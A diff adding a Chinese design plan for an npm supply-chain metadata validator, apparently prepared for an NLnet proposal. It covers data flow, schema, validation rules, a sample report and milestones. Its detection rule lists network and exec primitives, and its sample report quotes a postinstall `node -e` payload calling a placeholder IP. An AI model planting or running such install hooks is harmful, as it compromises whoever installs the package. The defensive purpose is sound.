@@ -1,0 +1,321 @@
+# NLnet CodeSupply OC#1 提案准备 · 任务 B：最小样例 Demo 设计方案
+
+本方案为 **10/20 前交付的最小可用样例 Demo（PoC）** 的工程级技术设计，涵盖从上游官方源采集、跨源归一化、供应链规则校验到开放数据集导出的全链路架构，可直接交由工程师开工实现。
+
+---
+
+## 1. 包生态选型：npm
+
+选定生态：**npm**（JavaScript / TypeScript 生态）。
+
+### 选择理由
+1. **API 易用性与开放性极佳（开箱即用，零鉴权门槛）**
+   - 官方 CouchDB 架构的 Registry API（`https://registry.npmjs.org/<pkg>`）直接返回包含全版本生命周期、发布历史与下载信息的完整 Packument 文档。
+   - 原生支持免 Token 公开读取，且支持基于 `time` 字段的轻量增量轮询与 Tarball 原生 HTTP 范围请求，工程开发成本最低，最适合在 1 周内（10/20 前）快速跑通。
+2. **元数据丰富度高且供应链属性最典型**
+   - 包含从作者身份（`maintainers`、`_npmUser`）、代码托管关联（`repository`、`gitHead` 提交哈希）、完整性校验（`dist.shasum`、`dist.integrity`）、到 Sigstore / GitHub Actions 密码学证明（`dist.signatures`、`dist.attestations`）的完整证据链条。
+   - 原生携带构建与安装生命周期脚本（`scripts.preinstall/postinstall`），为安全校验提供直接的静态检测输入。
+3. **与现有工具差异最明显（直击最痛盲区）**
+   - npm 是全球供应链攻击（排版抢注、幽灵发布者接管、构建物漂移、投毒安装脚本）最高发的重灾区。
+   - **ClearlyDefined** 偏法务静态扫描（仅依赖 ScanCode 抽取付款/版权文本），不校验发布者身份异动、不核验 Registry 与源码仓库的提交对齐，也不校验 SLSA 签名证明。
+   - **OSV** 是事后被动漏洞数据库，无漏洞时没有包级记录，根本不提供发布时元数据的规范化与主动校验。
+   - **deps.dev** 侧重依赖拓扑，其元数据为周期性快照，不进行 Tarball 物理解包与 Registry 声明的三方一致性对抗校验。
+   - 在 npm 生态上做“**官方 Registry 元数据 ↔ 物理 Tarball 实际内容 ↔ 源码仓库 Git Head**”三方交叉校验，最能直观证明本工具的不可替代性与技术价值。
+
+---
+
+## 2. Demo 技术设计
+
+### 2.1 数据流设计
+
+```
+[npm Registry API]
+        │ (HTTP GET Packument)
+        ▼
+   [采集器 Ingester] ──(下载并缓存)──> [物理 Tarball / package.json]
+        │
+        ▼
+   [归一器 Normalizer] ──(SPDX 解析 / 规范化 PURL)
+        │
+        ▼
+   [规范化对象 NormalizedPackageVersion]
+        │
+        ├────────────────────────────────┐
+        ▼                                ▼
+   [校验器 Validator]             [数据集导出器 Exporter]
+        │ (执行 8 项确定性规则)             │
+        ▼                                ▼
+   [校验报告 ValidationReport]    [开放数据集: JSONL / Parquet]
+```
+
+#### 2.1.1 原始元数据采集来源与端点
+- **包级全量 Packument 端点**：
+  - `GET https://registry.npmjs.org/{package_name}`
+  - 获取该包的所有发布版本列表、完整时间线字典（`time`）、维护者列表（`maintainers`）及每个版本的元数据。
+- **单版本元数据端点（轻量回落）**：
+  - `GET https://registry.npmjs.org/{package_name}/{version}`
+- **包构建物 Tarball 下载端点**：
+  - 从版本元数据中提取 `dist.tarball`（形如 `https://registry.npmjs.org/{pkg}/-/{pkg}-{ver}.tgz`），用于内存解包比对。
+- **Sigstore / SLSA 出处证明端点（如有）**：
+  - `GET https://registry.npmjs.org/-/npm/v1/attestations/{package_name}@{version}`
+
+#### 2.1.2 归一化 Schema 字段清单（Normalized Record）
+统一映射为扁平化与层级分明的强类型 Schema：
+
+| 字段名 | 类型 | 说明与示例 |
+|---|---|---|
+| `purl` | String | 标准 Package URL，如 `pkg:npm/express@4.18.2` |
+| `name` | String | 包名（含 scope），如 `express` 或 `@babel/core` |
+| `version` | String | 语义化版本号，如 `4.18.2` |
+| `is_prerelease` | Boolean | 是否为预发布版本（alpha/beta/rc） |
+| `published_at` | Timestamp (ISO 8601) | 发布时间，来自 `time[version]` |
+| `publisher_name` | String | 发布者用户名，来自 `_npmUser.name` |
+| `publisher_email` | String | 发布者邮箱，来自 `_npmUser.email` |
+| `maintainers` | Array[Object] | 当前合法维护者列表 `[{name, email}]` |
+| `repository_url` | String | 源码仓库规范化 URL（清洗掉 `git+` 前缀） |
+| `git_head_commit` | String | 发布时记录的 Git 提交哈希（40 位 SHA-1） |
+| `tarball_url` | String | 物理下载地址 `dist.tarball` |
+| `integrity_sha512` | String | 官方声明的 Subresource Integrity SHA-512 |
+| `has_sigstore_attestation` | Boolean | 是否包含官方 SLSA/Provenance 证明 |
+| `license_declared_raw` | String | 原始声明的许可证字符串（如 `MIT OR Apache-2.0`） |
+| `license_spdx_expression` | String | 归一化后的标准 SPDX 2.3 表达式 |
+| `is_license_spdx_valid` | Boolean | 是否符合 SPDX 规范语法 |
+| `is_license_osi_approved` | Boolean | 是否为 OSI 认可许可证 |
+| `dependencies_count` | Integer | 直接生产依赖数量 |
+| `has_install_scripts` | Boolean | 是否定义生命周期脚本（preinstall/install/postinstall） |
+| `install_scripts_content` | Object | 具体的生命周期脚本内容键值对 `{script_name: cmd}` |
+
+#### 2.1.3 校验规则条目（Validation Rules）
+校验器按确定性规则运行，输出严重度级别（`CRITICAL` / `HIGH` / `MEDIUM` / `LOW` / `INFO`）：
+
+1. **完整性与来源证明规则（Provenance & Integrity）**
+   - `RULE_INT_001` (`CRITICAL`): **Tarball 物理哈希不匹配**。下载 `dist.tarball` 流式计算 SHA-512，与 Registry 声明的 `dist.integrity` 比对。不一致即判定发布物遭镜像或传输中间人篡改。
+   - `RULE_INT_002` (`MEDIUM`): **源码提交追溯性缺失**。`git_head_commit` 为空或不是标准 40 位 SHA-1 格式，无法建立二进制物料与源码的追溯锚点。
+   - `RULE_INT_003` (`LOW`): **密码学出处证明缺失**。无 Sigstore 签名或 SLSA Attestation（用于标识现代安全供应链水位线）。
+2. **元数据漂移规则（Metadata Drift）**
+   - `RULE_DFT_001` (`CRITICAL`): **Tarball 内部声明与 Registry 漂移**。解包 Tarball 读取内置的 `package.json`，核对其与 Registry 中记录的 `dependencies`、`scripts`、`version` 是否完全一致。防止攻击者通过 npm API 伪造空元数据、但在实际安装包中夹带恶意依赖或脚本。
+   - `RULE_DFT_002` (`HIGH`): **幽灵发布者（Unlisted Publisher）**。版本的发布者 `_npmUser.name` 不在当前包的 `maintainers` 名单中（存在未授权发布或已失效凭据冒用风险）。
+3. **许可证规范与合法性规则（License Compliance）**
+   - `RULE_LIC_001` (`HIGH`): **许可证未声明或专有/未许可**。未声明许可证、声明为 `UNLICENSED` 或 `SEE LICENSE IN ...` 但未提供文件。
+   - `RULE_LIC_002` (`MEDIUM`): **SPDX 表达式语法非法**。如写成 `Apache 2.0`（应为 `Apache-2.0`）、`GPL`（未注版本），或括号逻辑操作符不闭合。
+4. **恶意利用与异常信号规则（Attack Signal Detection）**
+   - `RULE_SEC_001` (`HIGH`): **高危安装生命周期脚本**。定义了 `preinstall`、`install` 或 `postinstall` 钩子，且命令中包含高危网络调用或动态执行原语（如 `curl`, `wget`, `sh -c`, `powershell`, `node -e`, `base64`）。
+   - `RULE_SEC_002` (`MEDIUM`): **SemVer 语义版本突变**。版本号跳跃不符合递增惯例（如从 `1.2.0` 直接发布 `99.1.0`，高发于内部依赖混淆攻击）。
+
+#### 2.1.4 开放数据集输出格式
+导出的开放数据集采用 **双格式输出（JSONL + Parquet）**，二者基于同一数据模型：
+- **JSONL**：按行存放，流式写入，便于行处理工具（`jq` / `grep` / bash）管道消费及流式网络同步。
+- **Parquet**：采用 Snappy 压缩与列式存储。压缩比高（体积仅为原始 JSON 的 12% 左右），支持使用 DuckDB、ClickHouse、PySpark 在秒级进行大规模 SQL 分析。
+
+输出两个标准数据集：
+1. `metadata_packages.parquet` / `.jsonl`：包含归一化后的核心元数据。
+2. `validation_reports.parquet` / `.jsonl`：包含针对每个 `purl` 的校验评估明细。字段结构：
+   - `purl` (String)
+   - `evaluated_at` (Timestamp)
+   - `verdict` (String: `PASS` / `WARN` / `FAIL`)
+   - `critical_count` (Int), `high_count` (Int), `medium_count` (Int), `low_count` (Int)
+   - `findings` (JSON Array: `[{rule_id, severity, message, evidence_field, declared_value, actual_value}]`)
+
+---
+
+### 2.2 目录结构与模块划分
+
+```text
+pkg-meta-sentinel/
+├── README.md                  # 架构与运行说明
+├── pyproject.toml             # 项目元数据与依赖定义 (PEP 621)
+├── src/
+│   └── pkg_meta/
+│       ├── __init__.py
+│       ├── cli.py             # 统一 CLI 入口 (Typer)
+│       ├── collector/         # 模块 1: 原始元数据与物料采集器
+│       │   ├── __init__.py
+│       │   ├── npm_client.py  # 异步 HTTP 客户端 (重试、限流退避、缓存)
+│       │   └── tarball.py     # 内存流式解包与哈希计算器
+│       ├── normalizer/        # 模块 2: 规范化转换器
+│       │   ├── __init__.py
+│       │   ├── schema.py      # Pydantic V2 强类型领域模型
+│       │   ├── spdx.py        # 许可证语法解析与归一化
+│       │   └── npm_adapter.py # npm Packument -> NormalizedPackageVersion
+│       ├── validator/         # 模块 3: 规则引擎与断言校验器
+│       │   ├── __init__.py
+│       │   ├── engine.py      # 规则调度总线与判定打分器
+│       │   ├── rules/
+│       │   │   ├── integrity.py  # 哈希与签名检查
+│       │   │   ├── drift.py      # 元数据漂移与发布者核对
+│       │   │   ├── license.py    # 许可证合规
+│       │   │   └── security.py   # 生命周期脚本与反混淆
+│       └── exporter/          # 模块 4: 数据集与报告导出器
+│           ├── __init__.py
+│           ├── jsonl_writer.py
+│           └── parquet_writer.py
+├── data/                      # 样例数据产物目录
+│   ├── raw/                   # 原始 HTTP 响应与 Tarball 临时缓存
+│   └── export/                # 生成的样例开放数据集 (Parquet/JSONL)
+└── tests/                     # 单元与集成测试 (覆盖率 >= 80%)
+    ├── test_collector.py
+    ├── test_normalizer.py
+    └── test_validator.py
+```
+
+**模块间接口定义：**
+- `Collector.fetch_packument(name: str) -> dict`
+- `Collector.fetch_and_inspect_tarball(url: str) -> TarballInspectionResult`
+- `Normalizer.normalize(raw_pkg: dict, version: str) -> NormalizedPackageVersion`
+- `Validator.evaluate(pkg: NormalizedPackageVersion, tarball: TarballInspectionResult) -> ValidationReport`
+- `Exporter.dump(records: list[NormalizedPackageVersion], reports: list[ValidationReport], out_dir: Path)`
+
+---
+
+### 2.3 依赖清单（只用成熟成熟 FOSS 库）
+
+均为宽松开源许可（MIT / Apache-2.0 / BSD）：
+
+| 依赖库 | 版本约束 | 用途说明 | 开源许可证 |
+|---|---|---|---|
+| `pydantic` | `>=2.6.0` | 核心领域模型定义、强类型校验与序列化 | MIT |
+| `httpx` | `>=0.27.0` | 支持 HTTP/2 与连接池的现代异步 HTTP 采集客户端 | BSD-3-Clause |
+| `packageurl-python` | `>=0.15.0` | 工业界标准 PURL (Package URL) 解析与规范化 | MIT |
+| `license-expression` | `>=30.3.0` | SPDX 许可证表达式语法解析器（AboutCode 核心库，纯 Python） | Apache-2.0 |
+| `pyarrow` | `>=15.0.0` | 开放数据集底层 Apache Arrow 内存结构与 Parquet 高性能列式读写 | Apache-2.0 |
+| `typer` | `>=0.9.0` | 工业级命令行 CLI 工具封装 | MIT |
+| `rich` | `>=13.7.0` | 终端直观校验报告与进度可视化排版 | MIT |
+
+---
+
+### 2.4 验收标准与交付证据
+
+#### 2.4.1 样例数据集规模
+- **覆盖包数量**：120 个包。
+  - 100 个 npm 生态官方高频主流核心包（如 `express`, `lodash`, `chalk`, `react`, `axios`, `commander`, `debug`, `semver` 等）。
+  - 20 个历史典型异常/投毒样本或测试注毒样本（覆盖生命周期脚本外联、Registry 与 Tarball 内部 package.json 属性漂移、SPDX 表达式错乱、无签名与未记录发布者等）。
+- **覆盖版本行数**：提取对应包的最新稳定版及关键历史变动版，共计 **≥ 300 条规范化记录**。
+- **输出实体文件**：
+  - `data/export/packages.parquet`（约 150–250 KB）
+  - `data/export/packages.jsonl`（约 600 KB）
+  - `data/export/reports.jsonl`（约 400 KB）
+
+#### 2.4.2 校验报告样例（真实异常输出样例）
+
+```json
+{
+  "purl": "pkg:npm/%40malicious-demo/helper@1.0.4",
+  "evaluated_at": "2026-10-18T08:30:00Z",
+  "verdict": "FAIL",
+  "summary": {
+    "critical": 1,
+    "high": 2,
+    "medium": 1,
+    "low": 0
+  },
+  "findings": [
+    {
+      "rule_id": "RULE_DFT_001",
+      "severity": "CRITICAL",
+      "message": "Metadata drift detected: Tarball package.json introduces undeclared install scripts",
+      "evidence": {
+        "field": "scripts.postinstall",
+        "registry_declared": null,
+        "tarball_actual": "node -e 'require(\"http\").get(\"http://198.51.100.1/p\")'"
+      }
+    },
+    {
+      "rule_id": "RULE_SEC_001",
+      "severity": "HIGH",
+      "message": "Suspicious execution payload in lifecycle script",
+      "evidence": {
+        "hook": "postinstall",
+        "command": "node -e 'require(\"http\").get(\"http://198.51.100.1/p\")'",
+        "triggers": ["node -e", "http.get"]
+      }
+    },
+    {
+      "rule_id": "RULE_DFT_002",
+      "severity": "HIGH",
+      "message": "Publisher is not in the declared package maintainers list",
+      "evidence": {
+        "publisher": "ghost_attacker_dev",
+        "maintainers": ["alice_official", "bob_dev"]
+      }
+    },
+    {
+      "rule_id": "RULE_LIC_002",
+      "severity": "MEDIUM",
+      "message": "Declared license string is not a valid SPDX 2.3 expression",
+      "evidence": {
+        "declared": "Apache 2.0 and MIT",
+        "suggested_spdx": "Apache-2.0 AND MIT"
+      }
+    }
+  ]
+}
+```
+
+#### 2.4.3 与 ClearlyDefined / OSV 的单条记录全维度对比
+
+选取典型包：`pkg:npm/event-stream@3.3.6`（历史上发生过凭据交割与依赖注毒的著名包版本）：
+
+| 对比维度 | ClearlyDefined 现有数据记录 | OSV (osv.dev) 现有数据记录 | 本工具 Demo 校验输出记录（真实增量） |
+|---|---|---|---|
+| **核心定位** | 许可证与版权静态合规归档 | 漏洞咨询事件索引（Advisory Index） | **包发布元数据规范化 + 主动供应链证据交叉核验** |
+| **有无记录** | 有（Curation 结果） | 有（仅包含 GHSA-5545 漏洞公告） | **有（端到端规范化全生命周期档案）** |
+| **基础信息** | 解析出 `MIT` 许可证，抓取工具版本 `ScanCode 30.x` | 仅记录受影响版本范围（`<4.0.0`），无包基础属性 | 完整映射 PURL、Git 提交哈希、发布者、时间戳、依赖项 |
+| **物料一致性核验** | **无**（不检查 Tarball 哈希与 Registry 声明是否吻合） | **无**（完全不触碰二进制或发布包物料） | **有 (`RULE_INT_001`)**：实时校验 Tarball SHA-512 与 Registry 声明吻合度 |
+| **元数据漂移核验** | **无**（不对比 Tarball 内与 Registry 的元数据差异） | **无** | **有 (`RULE_DFT_001`)**：深度检测并比对内部 package.json 声明漂移 |
+| **维护者/发布者异常** | **无**（完全盲区，不追踪账号交接异动） | **无** | **有 (`RULE_DFT_002`)**：明确捕获发布者突然变更为新账号且历史无提交 |
+| **生命周期钩子审计** | **无** | **无** | **有 (`RULE_SEC_001`)**：解析并静态检测高危 install/postinstall 脚本 |
+| **数据交付形态** | 复杂的深层分层 REST API / 嵌套 JSON | 仅提供 OSV Schema JSON | **标准列式 Parquet + JSONL 开放数据集，支持 SQL 秒级过滤查询** |
+
+---
+
+## 3. 工作量拆分（6–9 个月兼职体量，总预算框 €12–18k）
+
+以 **0.15–0.25 FTE 兼职体量（总计约 300–400 人时）** 为基准，拆分为 3 个核心里程碑。里程碑权重前二者合计占 75%（严格对齐任务 A 的口径要求）：
+
+### 里程碑 1（M1，第 1–3 个月）：核心引擎工业级实现与 npm 生态全量流水线闭环
+- **工作范围**：
+  - 将 Demo 原型重构为高稳定性、支持异步并发与错误自动退避的流水线工具库与 CLI。
+  - 完善 npm 全量增量监听器（接入 npm `_changes` 流或日常增量发布 Feed）。
+  - 实现 Tarball 内存级极速流式解包校验器，确保零本地大磁盘占用。
+  - 完成完整的自动化单元与集成测试（覆盖率 ≥ 80%）。
+  - 构建 npm Top 10,000 包的历史基准开放数据集。
+- **交付物与验收标准**：
+  - **FOSS 代码库发布**：GitHub Release v0.1.0（全量开源，包含文档与 CI/CD 流水线）。
+  - **测试与代码质量**：Pytest 单元测试覆盖率报告 ≥ 80%，静态类型检查通过。
+  - **公开数据集发布**：在公开节点（如 Hugging Face Datasets 或 Zenodo）发布 npm Top 10,000 规范化 Parquet 数据集及对应的完整校验违规报告。
+- **周期与预算**：第 1–3 个月（开工 ~3 个月验收），**预算 €7,000（占 43.75%）**。
+
+### 里程碑 2（第 4–6 个月）：多生态扩展（PyPI / crates.io）与 Sigstore 证明强校验
+- **工作范围**：
+  - 抽象解耦通用采集器与归一化核心，新增 **PyPI**（Warehouse JSON API + PEP 740 证明）与 **crates.io** 官方注册表适配器。
+  - 增强密码学验签能力：正式集成 Sigstore 根证书信任链校验器，对 GitHub Actions OIDC 与 npm/PyPI 原生 SLSA 出处证明做证书链与身份主题核验。
+  - 规则库扩充：增加版本依赖混淆探测规则（Namespace confusion / Dependency confusion）。
+- **交付物与验收标准**：
+  - **FOSS 代码库发布**：GitHub Release v0.2.0，正式支持 npm、PyPI、crates.io 三大生态。
+  - **多生态开放数据集**：扩充至三大生态、覆盖 ≥ 50,000 个包版本的综合归一化数据集与校验报告。
+  - **技术文档**：发布多生态适配器编写指南与 Sigstore 签名校验合规率白皮书/评估报告。
+- **周期与预算**：第 4–6 个月，**预算 €5,000（占 31.25%）**。（M1 + M2 合计付款占 75%）。
+
+### 里程碑 3（第 7–9 个月）：常态化自动化发布流水线、生态格式适配与标准对接
+- **工作范围**：
+  - 搭建依托 GitHub Actions / 无服务器 Worker 的每日增量更新流水线，实现日级别增量元数据采集、校验与 Parquet 自动生成分发。
+  - 编写与上游开源基础设施的互操作适配器：支持输出转换为 OSV 格式或 ClearlyDefined 贡献输入格式，降低下游安全工具接入壁垒。
+  - 完成无障碍体验（a11y）梳理及安全加固，配合 NLnet 指定机构进行合规审计。
+- **交付物与验收标准**：
+  - **FOSS 代码库发布**：GitHub Release v1.0.0 正式版。
+  - **自动化常态流水线**：连续稳定运行 ≥ 30 天的公开每日数据集自动化更新 Pipeline。
+  - **累积开放数据集**：公开发布覆盖三大生态 ≥ 200,000 个版本的全量 Parquet 开放数据集。
+  - **生态互操作适配器**：提供 `to-osv` 与 `to-clearlydefined` 导出适配插件，并在主文档中提供完整的集成示例。
+- **周期与预算**：第 7–9 个月，**预算 €4,000（占 25.0%）**。
+
+---
+
+## 4. 落地与开工建议（10/20 前行动路径）
+
+1. **工程骨架搭建（预计 0.5 天）**：基于上述目录结构创建独立 Git 仓库，配置 `pyproject.toml`（安装 `httpx`, `pydantic`, `packageurl-python`, `license-expression`, `pyarrow`, `typer`）。
+2. **三核心模块编码（预计 1.5 天）**：
+   - 采集器：对接 `https://registry.npmjs.org/`，提取 Packument 与 Tarball。
+   - 归一器：完成 Pydantic 模型映射与 SPDX 正则/表达式校验。
+   - 校验器：硬编码上述 8 条确定性规则。
+3. **样本跑通与产物导出（预计 0.5 天）**：批量跑完 Top 100 常见包 + 20 个异常样本，导出 `packages.parquet` 与 `reports.jsonl`，直接生成验收证据包，以无可辩驳的运行实据支撑 NLnet 提案。
+DSH_EXIT=0
